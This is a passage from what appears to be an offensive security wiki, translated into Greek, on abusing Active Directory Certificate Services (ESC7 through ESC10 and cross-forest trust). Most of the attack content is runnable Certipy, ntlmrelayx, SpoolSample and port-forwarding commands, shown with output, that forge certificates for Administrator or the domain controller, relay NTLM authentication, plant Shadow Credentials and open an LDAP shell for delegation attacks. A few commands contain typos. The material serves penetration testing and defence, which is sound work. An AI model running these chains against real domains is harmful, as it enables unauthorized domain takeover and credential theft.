**Αυτό το αίτημα θα απορριφθεί**, αλλά θα αποθηκεύσουμε τον ιδιωτικό κλειδί και θα καταγράψουμε το αναγνωριστικό του αιτήματος.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Με τα **`Manage CA` και `Manage Certificates`** μπορούμε στη συνέχεια να **εκδώσουμε το αποτυχημένο πιστοποιητικό** αίτησης με την εντολή `ca` και την παράμετρο `-issue-request <ID αίτησης>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Και τελικά, μπορούμε **να ανακτήσουμε το εκδοθέν πιστοποιητικό** με την εντολή `req` και την παράμετρο `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## Προώθηση σελίδας NTLM προς τα σημεία HTTP του AD CS - ESC8

### Εξήγηση

{% hint style="info" %}
Σε περιβάλλοντα όπου **είναι εγκατεστημένο το AD CS**, εάν υπάρχει ένα **ευάλωτο σημείο τερματικής εγγραφής στον ιστό** και τουλάχιστον ένα **πρότυπο πιστοποιητικού είναι δημοσιευμένο** που επιτρέπει **την εγγραφή υπολογιστή τομέα και την πιστοποίηση πελάτη** (όπως το προεπιλεγμένο πρότυπο **`Machine`**), γίνεται δυνατή η **διακίνηση ενός υπολογιστή με ενεργή υπηρεσία spooler από έναν επιτιθέμενο**!
{% endhint %}

Πολλές **μέθοδοι εγγραφής με βάση το HTTP** υποστηρίζονται από το AD CS, διατίθενται μέσω επιπλέον ρόλων διακομιστή που οι διαχειριστές μπορεί να εγκαταστήσουν. Αυτές οι διεπαφές για την εγγραφή πιστοποιητικών με βάση το HTTP είναι ευάλωτες σε **επιθέσεις διακίνησης NTLM**. Ένας επιτιθέμενος, από ένα **υπολογιστή που έχει διαρραγεί, μπορεί να προσωποποιήσει οποιονδήποτε λογαριασμό AD που πιστοποιείται μέσω εισερχόμενου NTLM**. Προσωποποιώντας τον λογαριασμό θύματος, αυτές οι ιστοσελίδες μπορούν να προσπελαστούν από έναν επιτιθέμενο για **αίτηση ενός πιστοποιητικού πιστοποίησης πελάτη χρησιμοποιώντας τα πρότυπα πιστοποιητικών `User` ή `Machine`**.

* Η **διεπαφή εγγραφής στον ιστό** (μια παλαιότερη εφαρμογή ASP διαθέσιμη στο `http://<caserver>/certsrv/`), προεπιλεγμένα λειτουργεί μόνο με HTTP, το οποίο δεν προσφέρει προστασία ενάντια σε επιθέσεις διακίνησης NTLM. Επιπλέον, επιτρέπει ρητά μόνο την πιστοποίηση NTLM μέσω της κεφαλίδας HTTP Authorization της, καθιστώντας ανεφάρμοστες πιο ασφαλείς μεθόδους πιστοποίησης όπως το Kerberos.
* Η **Υπηρεσία Εγγραφής Πιστοποιητικών** (CES), η **Υπηρεσία Πολιτικής Εγγραφής Πιστοποιητικών** (CEP) και η **Υπηρεσία Εγγραφής Συσκευών Δικτύου** (NDES) υποστηρίζουν προεπιλεγμένα τη διαπραγμάτευση πιστοποίησης μέσω της κεφαλίδας HTTP Authorization τους. Η διαπραγμάτευση πιστοποίησης υποστηρίζει τόσο το Kerberos όσο και το **NTLM**, επιτρέποντας σε έναν επιτιθέμενο να **υποβαθμίσει σε NTLM** πιστοποίηση κατά τις επιθέσεις διακίνησης. Αν και αυτές οι υπηρεσίες ιστού ενεργοποιούν το HTTPS προεπιλεγμένα, το HTTPS μόνο του **δεν προστατεύει ενάντια σε επιθέσεις διακίνησης NTLM**. Η προστασία από επιθέσεις διακίνησης NTLM για υπηρεσίες HTTPS είναι δυνατή μόνο όταν το HTTPS συνδυάζεται με δέσμευση καναλιού. Δυστυχώς, το AD CS δεν ενεργοποιεί την Επέκταση Προστασίας για Πιστοποίηση στο IIS, η οποία απαιτείται για τη δέσμευση καναλιού.

Ένα κοινό **πρόβλημα** με τις επιθέσεις διακίνησης NTLM είναι η **σύντομη διάρκεια των συνεδριών NTLM** και η ανικανότητα του επιτιθέμενου να αλληλεπιδρά με υπηρεσίες που **απαιτούν υπογραφή NTLM**.

Ωστόσο, αυτό το περιορισμό ξεπερνιέται με την εκμετάλλευση μιας επίθεσης διακίνησης NTLM για την απόκτηση ενός πιστοποιητικού για τον χρήστη, καθώς η περίοδος ισχύος του πιστοποιητικού καθορίζει τη διάρκεια της συνεδρίας και το πιστοποιητικό μπορεί να χρησιμοποιηθεί με υπηρεσίες που **απαιτούν υπογραφή NTLM**. Για οδηγίες σχετικά με τη χρήση ενός κλεμμένου πιστοποιητικού, ανατρέξτε στο:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Ένας άλλος περιορισμός των επιθέσεων διακίνησης NTLM είναι ότι **ένα μηχάνημα που ελέγχεται από τον επιτιθέμενο πρέπει να πιστοποιηθεί από ένα λογαριασμό θύματος**. Ο επιτιθέμενος μπορεί είτε να περιμένει είτε να προσπαθήσει να **αναγκάσει** αυτήν την πιστοποίηση:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Κατάχρηση**

[**Certify**](https://github.com/GhostPack/Certify) το `cas` απαριθμεί τα **ενεργοποιημένα σημεία HTTP του AD CS**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Η ιδιότητα `msPKI-Enrollment-Servers` χρησιμοποιείται από επιχειρηματικές Αρχές Πιστοποίησης (CAs) για την αποθήκευση των σημείων υπηρεσίας Εγγραφής Πιστοποιητικών (CES). Αυτά τα σημεία υπηρεσίας μπορούν να αναλυθούν και να καταχωρηθούν χρησιμοποιώντας το εργαλείο **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

#### Κατάχρηση με Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Κατάχρηση με το [Certipy](https://github.com/ly4k/Certipy)

Το αίτημα για ένα πιστοποιητικό γίνεται από το Certipy από προεπιλογή με βάση το πρότυπο `Machine` ή `User`, που καθορίζεται από το εάν το όνομα λογαριασμού που μεταδίδεται τελειώνει σε `$`. Η καθορισμός ενός εναλλακτικού προτύπου μπορεί να επιτευχθεί μέσω της χρήσης της παραμέτρου `-template`.

Ένα τεχνική όπως το [PetitPotam](https://github.com/ly4k/PetitPotam) μπορεί στη συνέχεια να χρησιμοποιηθεί για να επιβάλει την ταυτοποίηση. Όταν ασχολείστε με ελεγκτές τομέων, απαιτείται η καθορισμός της παραμέτρου `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Χωρίς Επέκταση Ασφάλειας - ESC9 <a href="#id-5485" id="id-5485"></a>

### Εξήγηση

Η νέα τιμή **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) για το **`msPKI-Enrollment-Flag`**, γνωστή ως ESC9, αποτρέπει την ενσωμάτωση της **νέας επέκτασης ασφάλειας `szOID_NTDS_CA_SECURITY_EXT`** σε ένα πιστοποιητικό. Αυτή η σημαία γίνεται σημαντική όταν το `StrongCertificateBindingEnforcement` είναι ρυθμισμένο σε `1` (η προεπιλεγμένη ρύθμιση), το οποίο αντίθετα με τη ρύθμιση `2`. Η σημασία της αυξάνεται σε σενάρια όπου μια αδύναμη αντιστοίχιση πιστοποιητικού για Kerberos ή Schannel μπορεί να εκμεταλλευτεί (όπως στο ESC10), δεδομένου ότι η απουσία του ESC9 δεν θα αλλάξει τις απαιτήσεις.

Οι συνθήκες υπό τις οποίες η ρύθμιση αυτής της σημαίας γίνεται σημαντική περιλαμβάνουν:

* Το `StrongCertificateBindingEnforcement` δεν έχει προσαρμοστεί σε `2` (με την προεπιλεγμένη τιμή να είναι `1`), ή το `CertificateMappingMethods` περιλαμβάνει τη σημαία `UPN`.
* Το πιστοποιητικό είναι επισημασμένο με τη σημαία `CT_FLAG_NO_SECURITY_EXTENSION` εντός της ρύθμισης `msPKI-Enrollment-Flag`.
* Οποιαδήποτε EKU πιστοποίησης πελάτη καθορίζεται από το πιστοποιητικό.
* Οι άδειες `GenericWrite` είναι διαθέσιμες για οποιονδήποτε λογαριασμό για να διακινδυνεύσει έναν άλλο.

### Σενάριο Κατάχρησης

Υποθέστε ότι ο `John@corp.local` έχει δικαιώματα `GenericWrite` πάνω στον `Jane@corp.local`, με στόχο να διακινδυνεύσει τον `Administrator@corp.local`. Το πρότυπο πιστοποιητικού `ESC9`, στο οποίο η `Jane@corp.local` έχει άδεια να εγγραφεί, ρυθμίζεται με τη σημαία `CT_FLAG_NO_SECURITY_EXTENSION` στη ρύθμιση του `msPKI-Enrollment-Flag`.

Αρχικά, η κρυπτογράφηση της `Jane` αποκτιέται χρησιμοποιώντας τα Shadow Credentials, χάρη στο `GenericWrite` του `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Στη συνέχεια, η `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, προσβλητικά παραλείποντας το τμήμα του τομέα `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Αυτή η τροποποίηση δεν παραβιάζει τους περιορισμούς, δεδομένου ότι το `Administrator@corp.local` παραμένει διακριτικό ως `userPrincipalName` του `Administrator`.

Ακολούθως, το πρότυπο πιστοποιητικού `ESC9`, το οποίο έχει χαρακτηριστεί ευάλωτο, ζητείται ως `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Σημειώνεται ότι το `userPrincipalName` του πιστοποιητικού αντικατοπτρίζει το `Administrator`, χωρίς κανένα "object SID".

Στη συνέχεια, το `userPrincipalName` της `Jane` επαναφέρεται στον αρχικό του, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η προσπάθεια πιστοποίησης με το εκδοθέν πιστοποιητικό παράγει τώρα το NT hash του `Administrator@corp.local`. Η εντολή πρέπει να περιλαμβάνει το `-domain <domain>` λόγω της έλλειψης προδιαγραφής τομέα στο πιστοποιητικό:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Αδύναμες αντιστοιχίσεις πιστοποιητικών - ESC10

### Εξήγηση

Δύο τιμές κλειδιών μητρώου στον ελεγκτή τομέα αναφέρονται από το ESC10:

* Η προεπιλεγμένη τιμή για το `CertificateMappingMethods` κάτω από `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` είναι `0x18` (`0x8 | 0x10`), προηγουμένως ορίστηκε σε `0x1F`.
* Η προεπιλεγμένη ρύθμιση για το `StrongCertificateBindingEnforcement` κάτω από `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` είναι `1`, προηγουμένως `0`.

**Περίπτωση 1**

Όταν το `StrongCertificateBindingEnforcement` ρυθμίζεται ως `0`.

**Περίπτωση 2**

Εάν το `CertificateMappingMethods` περιλαμβάνει το bit `UPN` (`0x4`).

### Περίπτωση Κατάχρησης 1

Με το `StrongCertificateBindingEnforcement` ρυθμισμένο ως `0`, ένας λογαριασμός Α με δικαιώματα `GenericWrite` μπορεί να εκμεταλλευτεί για να διακινδυνεύσει οποιονδήποτε λογαριασμό Β.

Για παράδειγμα, με δικαιώματα `GenericWrite` πάνω στο `Jane@corp.local`, ένας επιτιθέμενος στοχεύει να διακινδυνεύσει τον `Administrator@corp.local`. Η διαδικασία αντικατοπτρίζει το ESC9, επιτρέποντας τη χρήση οποιουδήποτε προτύπου πιστοποιητικού.

Αρχικά, η κατακρυφής του `Jane` ανακτάται χρησιμοποιώντας τα Σκιώδη Διαπιστευτήρια, εκμεταλλευόμενο το `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, εσκεμμένα παραλείποντας το τμήμα `@corp.local` για να αποφευχθεί μια παραβίαση περιορισμού.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ακολουθώντας αυτό, ζητείται ένα πιστοποιητικό που επιτρέπει την πιστοποίηση του πελάτη ως `Jane`, χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` επαναφέρεται στην αρχική του τιμή, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η πιστοποίηση με το ληφθέν πιστοποιητικό θα παράγει το NT hash του `Administrator@corp.local`, απαιτώντας την καθορισμό του τομέα στην εντολή λόγω της απουσίας λεπτομερειών του τομέα στο πιστοποιητικό.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Περίπτωση Κατάχρησης 2

Με το `CertificateMappingMethods` περιέχοντας το bit flag `UPN` (`0x4`), ένας λογαριασμός Α με δικαιώματα `GenericWrite` μπορεί να εκμεταλλευτεί οποιονδήποτε λογαριασμό Β που λείπει το χαρακτηριστικό `userPrincipalName`, συμπεριλαμβανομένων των λογαριασμών μηχανών και του ενσωματωμένου διαχειριστή του τομέα `Administrator`.

Εδώ, ο στόχος είναι να διαρρεύσει ο λογαριασμός `DC$@corp.local`, ξεκινώντας με την απόκτηση του hash της `Jane` μέσω των Shadow Credentials, εκμεταλλευόμενος το `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'s `userPrincipalName` is then set to `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ένα πιστοποιητικό για την πιστοποίηση του πελάτη ζητείται ως `Jane` χρησιμοποιώντας το προεπιλεγμένο πρότυπο `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'s `userPrincipalName` επαναφέρεται στην αρχική του κατάσταση μετά από αυτήν τη διαδικασία.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Για να πιστοποιηθείτε μέσω του Schannel, χρησιμοποιείται η επιλογή `-ldap-shell` του Certipy, ενώ η επιτυχία πιστοποίησης εμφανίζεται ως `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Μέσω του LDAP κέλυφους, εντολές όπως `set_rbcd` ενεργοποιούν επιθέσεις Resource-Based Constrained Delegation (RBCD), που μπορεί να θέσουν σε κίνδυνο τον ελεγκτή του τομέα.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Αυτή η ευπάθεια επεκτείνεται και σε οποιονδήποτε λογαριασμό χρήστη που λείπει το `userPrincipalName` ή όπου δεν ταιριάζει με το `sAMAccountName`, με το προεπιλεγμένο `Administrator@corp.local` να είναι ένας κύριος στόχος λόγω των υψηλών προνομίων LDAP και της απουσίας `userPrincipalName` από προεπιλογή.

## Κατάργηση Δασών με Πιστοποιητικά Εξηγημένη σε Παθητική Φωνή

### Θραύση Δασών με Κατεστραμμένες CAs

Η διαμόρφωση για **διασυνοριακή εγγραφή** γίνεται σχετικά απλή. Το **πιστοποιητικό ρίζας CA** από το δάσος πόρων δημοσιεύεται στα δάση λογαριασμών από τους διαχειριστές, και τα πιστοποιητικά **enterprise CA** από το δάσος πόρων προστίθενται στα `NTAuthCertificates` και AIA containers σε κάθε δάσος λογαριασμού. Για να διευκρινίσουμε, αυτή η διάταξη χορηγεί στο **CA στο δάσος πόρων πλήρη έλεγχο** πάνω σε όλα τα άλλα δάση για τα οποία διαχειρίζεται το PKI. Αν αυτό το CA είναι **κατεστραμμένο από επιτιθέμενους**, τα πιστοποιητικά για όλους τους χρήστες τόσο στο δάσος πόρων όσο και στα δάση λογαριασμών μπορούν να **πλαστογραφηθούν από αυτούς**, σπάζοντας έτσι το όριο ασφαλείας του δάσους.

### Προνομίων Εγγραφής που Χορηγούνται σε Ξένους Αρχηγούς

Σε περιβάλλοντα με πολλά δάση, απαιτείται προσοχή όσον αφορά τα Enterprise CAs που **δημοσιεύουν πρότυπα πιστοποιητικών** τα οποία επιτρέπουν σε **Εξουσιοδοτημένους Χρήστες ή ξένους αρχηγούς** (χρήστες/ομάδες εξωτερικοί στο δάσος στο οποίο ανήκει το Enterprise CA) **δικαιώματα εγγραφής και επεξεργασίας**.\
Κατά την επαλήθευση σε ένα trust, το **SID των Εξουσιοδοτημένων Χρηστών** προστίθεται στο token του χρήστη από το AD. Έτσι, αν ένας τομέας διαθέτει ένα Enterprise CA με ένα πρότυπο που **επιτρέπει στους Εξουσιοδοτημένους Χρήστες δικαιώματα εγγραφής**, ένα πρότυπο θα μπορούσε πιθανότατα να **εγγραφεί από έναν χρήστη από διαφορετικό δάσος**. Αντίστοιχα, αν τα **δικαιώματα εγγραφής χορηγούνται ρητά σε ξένο αρχηγό από ένα πρότυπο**, δημιουργείται έτσι μια **σχέση ελέγχου πρόσβασης διασυνοριακά**, επιτρέποντας σε έναν αρχηγό από ένα δάσος να **εγγραφεί σε ένα πρότυπο από ένα άλλο δάσος**.

Και τα δύο σενάρια οδηγούν σε μια **αύξηση της επιφάνειας επίθεσης** από ένα δάσος σε ένα άλλο. Οι ρυθμίσεις του προτύπου πιστοποιητικού θα μπορούσαν να εκμεταλλευτούν από έναν επιτιθέμενο για να αποκτήσει επιπλέον προνόμια σε ένα ξένο τομέα.
